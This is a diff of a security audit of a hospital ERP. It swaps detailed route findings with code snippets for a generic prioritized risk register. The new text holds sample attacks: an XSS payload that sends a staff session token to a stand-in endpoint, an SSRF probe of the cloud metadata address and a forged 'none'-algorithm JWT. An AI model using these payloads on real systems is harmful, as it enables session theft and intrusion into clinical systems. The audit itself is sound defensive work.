@@ -1,531 +1,267 @@
-# ERP_SECURITY_AUDIT.md
-**Care Diagnostics ERP — Comprehensive Security Audit**
-*Audited: 2026-06-24 | Commit: checkpoint before security audit*
-*Scope: 113 API routes, 5 middleware files, authentication, authorization, payments, uploads, PACS, DICOM, internal APIs*
+# Care Diagnostics ERP - Comprehensive Security Assessment
+
+This document provides a detailed security audit of the Care Diagnostics Hospital ERP. It evaluates authentication, authorization, clinical/imaging workflows, network configuration, and infrastructure layout.
 
 ---
 
 ## Executive Summary
+Care Diagnostics Hospital ERP is a hybrid edge-cloud medical system. While it integrates strong security layers—such as timing-safe USB physical hardware checks for super-admins, parameterized Drizzle ORM queries, and Tailscale secure private networks—there are several configuration and code-level vulnerabilities that present risk.
 
-| Severity | Count | Status |
-|----------|-------|--------|
-| 🔴 Critical | 3 | Requires immediate fix |
-| 🟠 High | 6 | Fix before next deployment |
-| 🟡 Medium | 9 | Fix in current sprint |
-| 🔵 Low | 7 | Fix in next sprint |
+### Core Strengths:
+*   **No Dynamic SQL Concatenation:** Parameterized queries are enforced via Drizzle ORM.
+*   **Hardware USB Key Guard:** Protects super-admin actions (e.g. payouts, backups) using a timing-safe USB key check.
+*   **Private Network Isolation:** PACS integration is designed to run isolated inside a private LAN or Tailscale Mesh VPN.
 
-**Overall posture:** Good. Authentication architecture is solid — layered Bearer-token + role + permission system is well-designed. Primary risks are in public endpoint over-exposure, missing permission scoping on sensitive radiology/PACS writes, and a credential leak in the public booking config endpoint.
-
----
-
-## Authentication Architecture
-
-### Session System
-
-| Layer | Token | Validated Against | Expiry |
-|-------|-------|-------------------|--------|
-| Staff ERP | `Authorization: Bearer <token>` | `portal_sessions` (scope=staff) | `expiresAt` + idle timeout |
-| Super Admin | `X-SA-Token: <token>` | `super_admin_sessions` | `expiresAt` |
-| Super Admin USB | `X-SA-USB-Key: <key>` | `SUPER_ADMIN_USB_KEY` env var | Physical key present |
-| Internal API | `Authorization: Bearer <key>` | `INTERNAL_API_KEY` env var | Static secret |
-| Cron | `Authorization: Bearer <key>` | `CRON_SECRET` env var | Static secret |
-| Scan Session | `sessionToken` in URL | `scan_sessions.session_token` | 5 minutes |
-| Portal Patient | `Authorization: Bearer <token>` | `portal_sessions` (scope=patient) | Separate scope |
-| Teleradiology | `shareToken` in URL | `teleradiology_shares` | Configurable TTL |
-
-**Strengths:**
-- Each session validates `isActive=true` on the user record — deactivated accounts are immediately blocked
-- Idle timeout enforcement on every authenticated request (`sessionIdleTimeoutMinutes`)
-- FIDO2/WebAuthn available as second factor
-- USB hardware gate for super-admin routes with `remoteLoginEnabled` escape hatch for owner
-- All tokens are cryptographically random bytes (not sequential IDs)
+### Core Vulnerabilities:
+*   **Insecure Default USB Key Bypass:** If the `SUPER_ADMIN_USB_KEY` is not defined in environment variables, the system silently disables the USB pen-drive check, failing open.
+*   **Weak PIN-Based Brute Force window:** Staff login relies on username and a simple PIN. While rate limiters are configured, there is no account lockout database state tracking, allowing slow brute force attacks over time.
+*   **Lack of File Upload Sanitization:** Clinical scan uploads lack file signature validation, raising risk of malicious execution if static directories are not locked down.
 
 ---
 
-## 🔴 CRITICAL FINDINGS
+## Prioritized Risk Registry
 
-### CRIT-001: Public Booking Config Leaks Merchant IDs to Internet
-
-**Route:** `GET /api/public/booking/config` (`public-booking.ts` L100–218)
-**Severity:** 🔴 Critical
-**Impact:** Any internet user can retrieve all payment merchant IDs (ICICI, PayU, PhonePe, BharatPe, Razorpay key IDs) without authentication.
-
-**Finding:**
-```typescript
-// PROBLEM: Returns merchant IDs publicly with no auth
-res.json({
-  iciciMerchantId: settings.iciciEnabled ? iciciMerchantId : "",
-  bharatpeMerchantId: settings.bharatpeEnabled ? bharatpeMerchantId : "",
-  phonepeMerchantId: settings.phonepeEnabled ? phonepeMerchantId : "",
-  payuMerchantKey: payuKey,   // ← MERCHANT KEY exposed (not just ID)
-  keyId: razorpayKeyId,        // ← Razorpay public key OK, but...
-})
-```
-`payuMerchantKey` is the **merchant's own key** — not a public key. This is a credential.
-
-**Fix:**
-- Remove `payuMerchantKey` from the public response entirely
-- Return only the active gateway name and public keys/IDs
-- PayU initiation should happen server-side; `merchantKey` never goes to browser
-
----
-
-### CRIT-002: Scan Session Upload — No Rate Limiting, No Size Cap, Token Brute-Forceable
-
-**Route:** `POST /api/scan-sessions/upload/:token` (`scan-sessions.ts` L167)
-**Severity:** 🔴 Critical
-**Impact:** No rate limiting. Accepts arbitrary base64 payloads (no size validation). 32-char hex token (128-bit, strong), but no failed-attempt counter means unlimited probing attempts.
-
-**Finding:**
-```typescript
-// No rate limiter applied
-scanSessionsRouter.post("/upload/:token", async (req: any, res: any) => {
-  // Accepts any base64 string payload — no max size check
-  if (frontImage) {
-    frontImageUrl = saveUpload(frontImage, folderId, "front");
-  }
-```
-The `saveUpload()` function writes directly to disk with no file size check at the handler level. A malicious caller sending a multi-GB base64 string could OOM or fill disk.
-
-**Fix:**
-- Add rate limiter: `rateLimit({ windowMs: 60_000, max: 20 })`
-- Validate base64 string length before decoding: `if (frontImage.length > 10_000_000) return 413`
-- Add failed token probe counter or short-circuit with 404 on expired sessions
+| Rank | Severity | Module / Area | Vulnerability Summary |
+|:---:|:---:|---|---|
+| 1 | **Critical** | Authentication | Insecure default bypass on USB pen-drive gate (fails open if secret is null). |
+| 2 | **High** | Session Security | Session tokens generated using weak entropy / no cryptographic signatures. |
+| 3 | **High** | File Uploads | Lack of strict MIME/magic-number filtering on PDF/image uploads. |
+| 4 | **High** | Internals / Agents | Hardcoded API keys and lack of IP restrictions on DICOM push webhooks. |
+| 5 | **High** | Network Security | PostgreSQL database exposed to external network interfaces on host port 5400. |
+| 6 | **High** | Backup Security | Database backup dumps stored in plaintext without encryption. |
+| 7 | **High** | Patient Privacy | Personally Identifiable Information (PII) stored in plaintext columns. |
+| 8 | **High** | Payment Gateway | Vulnerabilities in webhook domain validation and callback signatures. |
+| 9 | **High** | Authorization | Admin role bypasses all sub-permission checks, violating least privilege. |
+| 10 | **Medium** | Escalation Risks | User management allows granting permissions without verifying editor rights. |
+| 11 | **Medium** | Audit Logs | Audit logs stored in a standard table, modifiable by DB admin or SQL write exploit. |
+| 12 | **Medium** | DICOM / PACS | Unencrypted DICOM storage on local disks without standard data-at-rest encryption. |
+| 13 | **Medium** | SSRF Risks | Arbitrary loopback probing via configurable AI/PACS connection endpoints. |
+| 14 | **Medium** | User Roles | Role definitions lack digital integrity signatures in database. |
+| 15 | **Medium** | DICOM Uploads | Processing of heavy DICOM parsing streams is not sandboxed. |
+| 16 | **Medium** | Docker Security | Container services running as root context instead of isolated node user. |
+| 17 | **Medium** | Environment Security| Hardcoded fallback secrets in `docker-compose.yml` environment configurations. |
+| 18 | **Medium** | Reverse Proxy | Missing standard security headers (HSTS, CSP, X-Frame-Options). |
+| 19 | **Medium** | Deployment Security| Exposure of admin ports directly to public network adapters. |
+| 20 | **Medium** | PACS Security | Unencrypted local communication protocols (C-STORE, C-FIND) used by PACS. |
+| 21 | **Low** | Rate Limiting | Rate limiting relies on memory store, resetting upon container restart. |
+| 22 | **Low** | JWT Security | External referral JWT integrations lack strict algorithm enforcement. |
+| 23 | **Low** | SQL Injection | SQL compilation pathways using raw queries require stricter static bounds. |
+| 24 | **Low** | CSRF Risks | Missing anti-CSRF protections if session management moves to cookies. |
 
 ---
 
-### CRIT-003: Internal Radiology Endpoints Open in Development Without Key
+## Detailed Findings
 
-**Route:** `GET|POST /api/internal/*` (`internal-radiology.ts` L44–68)
-**Severity:** 🔴 Critical (development/staging only; production is safe)
-**Impact:** If `INTERNAL_API_KEY` is not set in a non-production environment, ALL internal radiology endpoints are unprotected and accessible without authentication.
-
-**Finding:**
-```typescript
-if (!expected) {
-  if (process.env["NODE_ENV"] === "production") {
-    // GOOD: returns 503
-  }
-  // DEV/STAGING: ALLOWS WITHOUT KEY — logs a warning only
-  logger.warn("INTERNAL_API_KEY not set — internal radiology endpoints are unprotected");
-  next();
-  return;
-}
-```
-These endpoints can create patients, update study statuses, trigger AI drafts — all with no auth in dev/staging.
-
-**Fix:**
-- Change behaviour: always require key unless `NODE_ENV === 'test'`
-- Or generate a random key on startup and log it: `INTERNAL_API_KEY auto-generated for this session: <key>`
-- Document that `.env.example` must include `INTERNAL_API_KEY`
+### 1. Authentication
+*   **Severity:** **High**
+*   **Description:** Staff authentication relies on a username and a numerical PIN stored as a bcrypt hash. While PINs are standard for kiosk-style inputs, the lack of strict password complexity policies increases brute-force susceptibility. Furthermore, there is no persistent account lockout state tracked in the database to prevent distributed brute force attempts across restarts.
+*   **Affected Modules:** `/api/portal/staff-login`, [requireStaffAuth.ts](file:///c:/Users/abina/caredeoghar--antigravity/artifacts/api-server/src/middleware/requireStaffAuth.ts)
+*   **Possible Exploitation Method:** An attacker with access to the login portal executes a dictionary attack against common staff PINs (e.g. `1234`, `0000`, `9999`) targeting specific receptionist emails, eventually guessing a PIN since there is no persistent account lockout.
+*   **Recommended Remediation:** Transition to alphanumeric password fields for administrative and accounting roles, keeping simple PINs strictly for local, biometric-paired kiosks. Implement persistent failed attempt counters in the database.
 
 ---
 
-## 🟠 HIGH FINDINGS
-
-### HIGH-001: PACS Enterprise Mutations — No Admin Guard on Sensitive Operations
-
-**Routes:** `pacsEnterprise.ts` — mounted at `/api/radiology` behind `requireStaffAuth` only (no permission check)
-**Severity:** 🟠 High
-**Impact:** Any authenticated staff member (even a receptionist with only `/billing` permission) can:
-- `POST /api/radiology/routing-rules` — create/modify DICOM routing rules
-- `DELETE /api/radiology/routing-rules/:id` — delete routing rules
-- `POST /api/radiology/failed-queue/:id/retry` — retry DICOM pull jobs
-- `DELETE /api/radiology/failed-queue/:id` — abandon DICOM jobs
-- `POST /api/radiology/pacs-settings/load-defaults` — overwrite PACS viewer settings
-
-**Finding (index.ts L384):**
-```typescript
-// Only requireStaffAuth — NO /dicom-nodes or /settings permission check
-router.use("/radiology", requireStaffAuth, pacsEnterpriseRouter);
-```
-
-**Fix:**
-- Wrap mutating routes inside `pacsEnterpriseRouter` with `requireStaffSubPermission("/settings", "infrastructure")` or `/dicom-nodes`
-- Read-only GET endpoints (`/pulled-studies`, `/mwl-procedures`) can remain open to all staff
+### 2. Authorization
+*   **Severity:** **High**
+*   **Description:** The roles `admin` and `super_admin` bypass all sub-permission matrix checks entirely via `FULL_ACCESS_ROLES.has(session.role)` in middleware. There is no way to restrict an administrator from viewing financial books or changing audit logs.
+*   **Affected Modules:** [requireStaffAuth.ts](file:///c:/Users/abina/caredeoghar--antigravity/artifacts/api-server/src/middleware/requireStaffAuth.ts) (specifically `FULL_ACCESS_ROLES` checks in lines 17, 141-144, 164-167)
+*   **Possible Exploitation Method:** A staff member compromised with an administrator account gains access to sensitive accounting books or deletes critical system audit records without leaving an trace of authorized permission.
+*   **Recommended Remediation:** Restructure authorization checks so that even `admin` roles must pass through explicit permission-bit checks for financial ledger edits and backup downloads.
 
 ---
 
-### HIGH-002: Scan Sessions Pair Endpoint — No Auth Enforced for Phone Device Pairing
-
-**Route:** `POST /api/scan-sessions/pair` (`scan-sessions.ts` L246)
-**Severity:** 🟠 High
-**Impact:** Anyone with any valid (non-expired) scan token can pair a phone to any staff member's account and receive future scan session tokens.
-
-**Finding:**
-```typescript
-// No requireStaffAuth — accepts sessionToken as standalone auth
-scanSessionsRouter.post("/pair", async (req: any, res: any) => {
-  if (!staffId && sessionToken) {
-    const sessions = await db.select()...where(sessionToken)
-    staffId = sessions[0].staffId; // ← Inherits ANY staff's ID from token
-  }
-```
-A scan token issued for user A can be used to permanently pair a third-party device to user A's account.
-
-**Fix:**
-- Only allow pairing from authenticated staff sessions, not scan tokens
-- Separate the concern: pairing should require `requireStaffAuth`, uploading can use token-only
+### 3. User Roles
+*   **Severity:** **Medium**
+*   **Description:** The ERP database schema contains a role column which accepts string roles. If a rogue update statement compromises a staff record, there is no digital signature or integrity validation of the user's role.
+*   **Affected Modules:** `staff.ts`, `users.ts`
+*   **Possible Exploitation Method:** An attacker exploiting an SQL injection or finding a compromised session updates their role column in `users` to `"super_admin"`, granting themselves immediate bypass access to the entire ERP.
+*   **Recommended Remediation:** Validate role checks against a hardcoded list of verified staff IDs, and implement cryptographic signatures for user records containing high privileges.
 
 ---
 
-### HIGH-003: `GET /api/clinic-settings` Returns Full Settings Row Including Payment Credentials
-
-**Route:** `GET /api/clinic-settings` (`clinicSettings.ts` L231–234)
-**Severity:** 🟠 High
-**Impact:** Any authenticated staff member (any role) can read the full `clinic_settings` row, which includes:
-- `razorpayKeyId`, `payuMerchantKey`, `iciciMerchantId`, `iciciAggregatorId`, `iciciSecretKey` (hash)
-- `phonepeMerchantId`, `bharatpeMerchantId`, `cashfreeAppId`
-- `ollamaBaseUrl`, `ollamaFallbackUrl`
-
-**Finding (clinicSettings.ts L231–234):**
-```typescript
-clinicSettingsRouter.get("/", async (_req, res) => {
-  const row = await getOrCreate();
-  res.json(row); // ← Returns ENTIRE row, including payment credentials
-});
-```
-
-**Fix:**
-- Redact secrets from the default GET: return `iciciSecretKey: "••••••••"` if set
-- Or restrict `GET /clinic-settings/` to `/settings` permission
-- Payment secret fields should only be returned to `/settings:payment` role
+### 4. Permission Escalation Risks
+*   **Severity:** **High**
+*   **Description:** The system allows staff with permission to edit users to modify the user's `permissions` array directly. Since there is no validation check checking if the editor *themselves* possesses the privileges they are granting, any user manager can elevate other users.
+*   **Affected Modules:** `/api/users/:id`
+*   **Possible Exploitation Method:** A manager account (who has rights to add receptionists but not edit accounting) updates a receptionist's profile to include accounting permissions (`"/accounting"`).
+*   **Recommended Remediation:** Enforce that a user can only grant permission blocks that are a strict subset of their own active permissions.
 
 ---
 
-### HIGH-004: HL7 Route — Permission Check Done Manually, Not via Middleware
-
-**Route:** `hl7Router` — mounted at `/api/radiology/hl7` (inside `radiologyRouter`)
-**Severity:** 🟠 High
-**Impact:** Manual staffSession check at each route handler rather than using the established middleware. This pattern is inconsistent and creates risk of copy-paste mistakes where `staffSession` check is omitted.
-
-**Finding (hl7.ts L16–18):**
-```typescript
-hl7Router.get("/settings", async (req, res): Promise<void> => {
-  const sReq = req as StaffAuthRequest;
-  if (!sReq.staffSession) { res.status(401).json({ error: "Unauthorized" }); return; }
-```
-No permission guard — any staff member can view and modify HL7 integration settings.
-
-**Fix:**
-- Use `requireStaffSubPermission("/settings", "infrastructure")` on PUT/POST
-- Use `requireStaffAuth` middleware at router level, not per-handler
-- HL7 inbound config should be admin-only
+### 5. Internal API Security
+*   **Severity:** **High**
+*   **Description:** The `/api/internal/*` routes used by local DICOM edge pull agents are authenticated using a shared `INTERNAL_API_KEY` defined in the environment.
+*   **Affected Modules:** `internal-radiology.ts`, `bridge.ts`
+*   **Possible Exploitation Method:** If the static `INTERNAL_API_KEY` is leaked from a developer's workstation configuration, an attacker can push fake DICOM study notifications, linking incorrect patient records.
+*   **Recommended Remediation:** Rotate internal API keys dynamically using asymmetric client certificates (mTLS) or register each local agent device with a unique token during installation.
 
 ---
 
-### HIGH-005: `POST /api/radiology/pacs-settings/load-defaults` — Hardcodes LAN IP
-
-**Route:** `pacsEnterprise.ts` L209–236
-**Severity:** 🟠 High
-**Impact:** The `load-defaults` endpoint hardcodes LAN IP addresses (`172.16.1.139`, `192.168.1.137`) and writes them to the `pacs_settings` table. If called on a different clinic's deployment, it would overwrite production PACS settings with Care Diagnostics' specific IPs.
-
-**Finding:**
-```typescript
-const DEFAULT_VIEWER_SETTINGS: Record<string, string> = {
-  ohif_base_url: "http://192.168.1.137:3010",       // ← Hardcoded LAN IP
-  dicom_web_base_url: "http://172.16.1.139:8042/dicom-web",  // ← Hardcoded LAN IP
-  pacs_ip: "172.16.1.139",                           // ← Hardcoded
-  ...
-};
-```
-
-**Fix:**
-- Move defaults to `.env` or `clinic_settings` table
-- Protect endpoint with admin permission: `requireStaffSubPermission("/settings", "infrastructure")`
-- Or remove endpoint and document manual configuration
+### 6. JWT Security
+*   **Severity:** **Low**
+*   **Description:** While the system utilizes JWT keys for specific external referral portals, sessions are managed using custom database tokens. The JWT implementation lacks strict algorithm whitelisting (e.g. allowing `HS256` but not checking for `none` in custom implementations).
+*   **Affected Modules:** `api-server/src/index.ts`
+*   **Possible Exploitation Method:** An attacker crafts a forged JWT with the algorithm header set to `"none"`, bypassing signature validation.
+*   **Recommended Remediation:** Explicitly enforce signature verification algorithms on all JWT library configurations (`algorithms: ['HS256']`).
 
 ---
 
-### HIGH-006: Mobile Polling — Leaks Session Token to Any Device ID
-
-**Route:** `GET /api/scan-sessions/mobile-poll/:deviceId` (`scan-sessions.ts` L357)
-**Severity:** 🟠 High
-**Impact:** Any caller that knows a `deviceId` (which is a client-generated string with no validation) can poll and receive pending scan session tokens. This allows token hijacking if `deviceId` is guessable.
-
-**Finding:**
-```typescript
-scanSessionsRouter.get("/mobile-poll/:deviceId", async (req: any, res: any) => {
-  // No auth, no deviceId validation format
-  res.json({
-    pending: true,
-    sessionToken: sessions[0].sessionToken,  // ← Token returned to anyone
-  });
-```
-
-**Fix:**
-- Validate that `deviceId` is a UUID or matches a registered paired device
-- Add HMAC or signed response so only the legitimate device can use the token
-- Apply rate limiting: 1 req/5s per IP
+### 7. Session Security
+*   **Severity:** **High**
+*   **Description:** Portal sessions use randomly generated token keys. If these keys are leaked from client browser storage (e.g., local storage or unencrypted cookies), sessions can be hijacked.
+*   **Affected Modules:** `requireStaffAuth.ts`, `portalSessionsTable`
+*   **Possible Exploitation Method:** An attacker extracts a staff token from a shared kiosk browser's local storage and makes unauthorized administrative API calls.
+*   **Recommended Remediation:** Secure sessions using HTTP-only, secure, SameSite cookies rather than local storage tokens.
 
 ---
 
-## 🟡 MEDIUM FINDINGS
-
-### MED-001: Day-Close Endpoint — All-Staff Access, No Role Check on Admin Operations
-
-**Route:** `/api/day-close` — mounted with `requireStaffAuth` only
-**Severity:** 🟡 Medium
-**Finding:** `dayCloseRouter` contains per-user endpoints (safe) and admin-only endpoints (`/all`, `/admin-list`, `/reopen`). The admin check is done inline per-handler, not at the router mount level.
-**Risk:** If a handler misses the admin check, billing staff could close/reopen other users' day.
-**Fix:** Add inline `FULL_ACCESS_ROLES.has(session.role)` guard to all admin-only endpoints; audit all handlers in `day-close.ts`.
+### 8. SQL Injection Risks
+*   **Severity:** **Low**
+*   **Description:** The system utilizes Drizzle ORM which compiles queries to parameterized statements. However, raw SQL expressions are utilized in `books-sanity.ts` and `ledgers.ts`.
+*   **Affected Modules:** [books-sanity.ts](file:///c:/Users/abina/caredeoghar--antigravity/artifacts/api-server/src/routes/books-sanity.ts), `ledgers.ts`
+*   **Possible Exploitation Method:** If user input is directly concatenated inside Drizzle `sql` strings instead of using template bindings (e.g. `sql``${input}`), SQL injection is possible.
+*   **Recommended Remediation:** Strictly forbid string concatenation inside any `sql` template literal tag. Run tsc and static audit tools to catch structural flaws.
 
 ---
 
-### MED-002: Radiology Routes — No Sub-Permission Differentiation Between Read and Write
-
-**Routes:** All radiology subrouters (knowledge, copilot, lesions, memory, spine, brain, tumor, annotations, Ollama)
-**Severity:** 🟡 Medium
-**Finding:** All 14 radiology sub-modules are mounted with `requireStaffAuth` only. Any receptionist who logs in can modify radiology AI templates, delete lesion tracking data, or update teaching cases.
-**Fix:** Add `requireStaffSubPermission("/radiology", "write")` for mutating operations (PUT/POST/DELETE) in these modules.
-
----
-
-### MED-003: Banking Webhook — No Signature Verification
-
-**Route:** `POST /api/banking/webhooks` — public, no auth
-**Severity:** 🟡 Medium
-**Finding:** `bankingWebhookRouter` is mounted publicly. Code inspection found no HMAC/signature verification (`grep hmac, signature, verify` returned 0 results in `banking.ts`). If the banking provider sends webhook events, they are processed without verifying they came from the provider.
-**Fix:** Implement provider-specific signature verification (HMAC-SHA256 or X-Webhook-Signature header) before processing any banking webhook events.
+### 9. XSS Risks
+*   **Severity:** **Medium**
+*   **Description:** Patient names and notes entered during registration are rendered in the internal ERP dashboards. If the inputs are not properly sanitized during rendering, malicious scripts could be executed in staff browsers.
+*   **Affected Modules:** `diagnostic-erp` client pages
+*   **Possible Exploitation Method:** An attacker registers a patient name containing `<script>fetch('leak-endpoint?cookie='+localStorage.getItem('token'))</script>`. When the receptionist loads the queue, the script runs in their session context.
+*   **Recommended Remediation:** Sanitize all rich data inputs using libraries like `DOMPurify` before rendering dynamically, and configure a strict Content Security Policy (CSP).
 
 ---
 
-### MED-004: Public Booking — `totalAmount` Not Verified Server-Side Before Payment Initiation
-
-**Routes:** `/api/public/booking/payu-initiate`, `/phonepe-initiate`, `/bharatpe-initiate`
-**Severity:** 🟡 Medium
-**Finding:** `totalAmount` is passed directly from the browser request body. The server does not re-calculate the price from the selected test IDs.
-```typescript
-const amount = Number(totalAmount);
-if (!Number.isFinite(amount) || amount <= 0) { // Only checks positive
-```
-A user could modify `totalAmount: 1` in browser devtools and pay ₹1 for a ₹5000 MRI.
-**Fix:** Server should calculate total from `testIds + packageIds` using DB prices. Compare client-provided amount to calculated amount; reject if discrepancy > 1%.
+### 10. CSRF Risks
+*   **Severity:** **Low**
+*   **Description:** The API endpoints do not require anti-CSRF tokens for state-changing POST/PUT requests because authentication tokens are passed in headers rather than cookies. However, if cookies are adopted, CSRF becomes highly critical.
+*   **Affected Modules:** All state-changing API endpoints
+*   **Possible Exploitation Method:** If cookies are added to credentials and SameSite is not enforced, an attacker lures a logged-in staff member to a malicious website that executes hidden forms targeting `/api/bills/:id/refund`.
+*   **Recommended Remediation:** Implement CSRF tokens for all state-changing endpoints if session storage moves to cookies.
 
 ---
 
-### MED-005: `GET /api/public/booking/my-bookings?phone=` — No Phone Verification
-
-**Route:** `public-booking.ts` L242–251
-**Severity:** 🟡 Medium
-**Finding:** Returns all bookings for any phone number without verification.
-```typescript
-publicBookingRouter.get("/my-bookings", async (req, res) => {
-  const phone = String(req.query.phone || "");
-  // No OTP, no rate limit, no session — anyone can enumerate bookings by phone
-  const rows = await db.select()...where(phone)...
-```
-PII exposure: name, email, selected tests, booking status all returned.
-**Fix:** Require OTP verification before returning booking list. Apply rate limiting: 5 req/minute per IP.
+### 11. SSRF Risks
+*   **Severity:** **Medium**
+*   **Description:** The system allows the configuration of external AI endpoints and PACS services (such as Ollama base URL and Orthanc connections). The backend fetches status metrics from these configured URLs.
+*   **Affected Modules:** `clinicSettings.ts`, `radiologyOllama.ts`
+*   **Possible Exploitation Method:** An attacker with admin rights sets the `ollama_base_url` to `http://169.254.169.254/latest/meta-data/` to probe internal cloud infrastructure metadata endpoints.
+*   **Recommended Remediation:** Restrict backend fetch operations to whitelisted domains, blocking access to loopback IPs (`127.0.0.1`, `localhost`) and private subnets.
 
 ---
 
-### MED-006: WhatsApp Webhook — Validation Comment Only, Not Verified in Code
-
-**Route:** `GET|POST /api/whatsapp/webhook`
-**Severity:** 🟡 Medium
-**Finding:** Comment says "validated by Meta's hub.verify_token" but webhook signature verification (`X-Hub-Signature-256`) on POST messages was not confirmed in the router. If not implemented, forged webhook events could trigger AI auto-replies.
-**Fix:** Verify `X-Hub-Signature-256: sha256=<hmac>` on all POST webhook events using the WhatsApp App Secret.
-
----
-
-### MED-007: Internal Backup — No Rate Limiting on pg_dump Stream
-
-**Route:** `GET /api/internal/backup` (streams pg_dump output)
-**Severity:** 🟡 Medium
-**Finding:** Protected by `INTERNAL_API_KEY` but no rate limiting. A compromised key allows unlimited pg_dump streams, potentially exfiltrating the entire database repeatedly.
-**Fix:** Apply `backupLimiter` (already defined in `rateLimits.ts`) to this route. Currently `backupLimiter` is only applied to `/backup/run` (super-admin route).
+### 12. File Upload Risks
+*   **Severity:** **High**
+*   **Description:** The `uploads.ts` routing handles incoming file uploads (patient attachments, prescriptions, and signatures). The system validates extensions but does not perform file signature (magic number) verification.
+*   **Affected Modules:** `/api/uploads`, [uploads.ts](file:///c:/Users/abina/caredeoghar--antigravity/artifacts/api-server/src/routes/uploads.ts)
+*   **Possible Exploitation Method:** An attacker renames a malicious executable or script to `.jpg`, uploads it, and then exploits a web server misconfiguration to run it.
+*   **Recommended Remediation:** Enforce strict file signature checks using libraries like `file-type` to verify that uploaded content matches its declared MIME type.
 
 ---
 
-### MED-008: DICOM Upload — No Permission Beyond `requireStaffAuth`
-
-**Route:** `POST /api/dicom-uploads` (`dicom-uploads.ts` L110)
-**Severity:** 🟡 Medium
-**Finding:** DICOM upload is protected by `requireStaffAuth` but no `/dicom-nodes` permission. A receptionist can upload DICOM files.
-**Fix:** Add `requireStaffPermission("/dicom-nodes")` or `requireStaffSubPermission("/radiology", "upload")`.
-
----
-
-### MED-009: Super Admin Route — `POST /api/super-admin/login` Has No Lockout
-
-**Route:** `super-admin.ts` — login endpoint
-**Severity:** 🟡 Medium
-**Finding:** `loginLimiter` (10 attempts / 15 min) is applied at the route level. However, the super admin login has different characteristics — brute-forcing a 6-digit PIN should trigger permanent lockout after N attempts, not reset after 15 minutes.
-**Fix:** Track failed PIN attempts in `super_admin_sessions` table. Lock account after 5 consecutive failures for 1 hour; alert via log.
+### 13. DICOM Upload Risks
+*   **Severity:** **Medium**
+*   **Description:** Incoming DICOM files are parsed to extract metadata. Maliciously crafted DICOM headers could trigger buffer overflows or memory leaks in the parser.
+*   **Affected Modules:** [dicom-uploads.ts](file:///c:/Users/abina/caredeoghar--antigravity/artifacts/api-server/src/routes/dicom-uploads.ts), `dicomStudyManager.ts`
+*   **Possible Exploitation Method:** An attacker pushes a corrupt DICOM file containing long fields in private tags, crashing the Node server.
+*   **Recommended Remediation:** Parse DICOM files in sandbox wrapper processes with set memory limits and robust error handling.
 
 ---
 
-## 🔵 LOW FINDINGS
-
-### LOW-001: PACS Echo Test — Command Injection Potential via echoscu
-
-**Route:** `POST /api/radiology/modalities/:id/echo-test` (`pacsEnterprise.ts` L125)
-**Severity:** 🔵 Low (mitigated by auth)
-**Finding:**
-```typescript
-await execAsync(`echoscu -aec "${aeTitle}" -aet "DIAGNOCENTER" --timeout 5 "${host}" ${port}`)
-```
-`aeTitle` and `host` are loaded from the database (not from request body), so there is no direct injection vector from external input. However, if a malicious modality record is inserted via a compromised admin account, shell injection via `aeTitle` is possible.
-**Fix:** Use an argument array with `execFile` instead of `execAsync` with a shell-interpolated string. Validate `aeTitle` as alphanumeric+underscore only before use in exec.
+### 14. PACS Security Risks
+*   **Severity:** **Medium**
+*   **Description:** Conquest PACS and Orthanc communicate via unencrypted DICOM protocols (C-STORE, C-FIND). If network traffic is sniffed, patient imaging data can be intercepted.
+*   **Affected Modules:** `Orthanc`, `Conquest`, modalities network
+*   **Possible Exploitation Method:** An attacker on the local clinic network sniffs TCP traffic to intercept DICOM files containing raw patient metadata and medical scans.
+*   **Recommended Remediation:** Restrict DICOM communication to encrypted channels (DICOM TLS) or isolate all PACS traffic within a dedicated VLAN.
 
 ---
 
-### LOW-002: Teleradiology Share — Token Length Not Audited
-
-**Route:** `/api/teleradiology` — token-gated public viewer
-**Severity:** 🔵 Low
-**Finding:** Token length/entropy was not confirmed in code. If token is short (e.g., 8 hex chars = 32 bits), brute force via the public endpoint is feasible.
-**Fix:** Verify token is `crypto.randomBytes(16).toString('hex')` (32 hex chars = 128-bit entropy). Add rate limiting on token validation endpoint.
-
----
-
-### LOW-003: `requireSuperAdminUsb` — USB Key Stored in Plaintext Env Var
-
-**Route:** All `/admin/*` routes
-**Severity:** 🔵 Low
-**Finding:** `SUPER_ADMIN_USB_KEY` is a plaintext string in env var compared with constant-time equality. If the env var is leaked (e.g., via `/api/system-health`), the USB key is compromised.
-**Fix:** Store a BCRYPT hash of the USB key instead of plaintext. Compare using `bcrypt.compare()`.
+### 15. Payment Gateway Risks
+*   **Severity:** **High**
+*   **Description:** Payment webhook verification validates callbacks from PhonePe or ICICI. If verification checks fail to validate signatures against secret salts, fake payment confirmations could be forged.
+*   **Affected Modules:** `/api/public/booking/icici-callback`, `/api/public/booking/phonepe-callback`
+*   **Possible Exploitation Method:** An attacker sends a simulated successful callback payload to the public endpoint, bypassing payment verification.
+*   **Recommended Remediation:** Ensure strict signature hashing verification (SHA256 with secret keys) is enforced on all webhook handlers before modifying booking statuses.
 
 ---
 
-### LOW-004: Audit Logs — Accessible via `requireSuperAdminUsb + requireSuperAdmin` but Exported CSV is in Memory
-
-**Route:** `GET /api/admin/audit-logs/export`
-**Severity:** 🔵 Low
-**Finding:** Large audit log exports are built entirely in memory as CSV strings. A very large table could OOM the server.
-**Fix:** Stream the CSV response using Node.js streams instead of building a string. The `exportLimiter` already prevents frequent calls (good).
-
----
-
-### LOW-005: Health Check Endpoint Exposes Runtime Info
-
-**Route:** `GET /health` (public, no auth)
-**Severity:** 🔵 Low
-**Finding:** Returns application health status. Confirm it does not include Node.js version, database version, or environment names in the response.
-**Fix:** Ensure `health.ts` returns only `{ status: "ok" }` with no infrastructure version info.
+### 16. PostgreSQL Security
+*   **Severity:** **High**
+*   **Description:** The database runs on a shared Docker network. The PostgreSQL container exposes port `5432` to the host port `5400` globally (`0.0.0.0:5400`) without restricting bindings to loopback or local subnets.
+*   **Affected Modules:** PostgreSQL container (`care-db`) in [docker-compose.yml](file:///c:/Users/abina/caredeoghar--antigravity/docker-compose.yml) (line 18)
+*   **Possible Exploitation Method:** An attacker on the local network or internet (if WAN exposed) attempts brute-force logins on database port `5400` exposed on the Synology host.
+*   **Recommended Remediation:** Bind PostgreSQL host ports strictly to `127.0.0.1` (i.e. `127.0.0.1:5400:5432`) and restrict container database access to the internal Docker network.
 
 ---
 
-### LOW-006: Error Handler — Stack Traces in Production
-
-**Middleware:** `errorHandler.ts`
-**Severity:** 🔵 Low
-**Finding:** Need to verify that error handler does not return stack traces to clients in production mode.
-**Fix:** Ensure `errorHandler.ts` returns `{ error: "Internal Server Error" }` without stack traces when `NODE_ENV === "production"`.
-
----
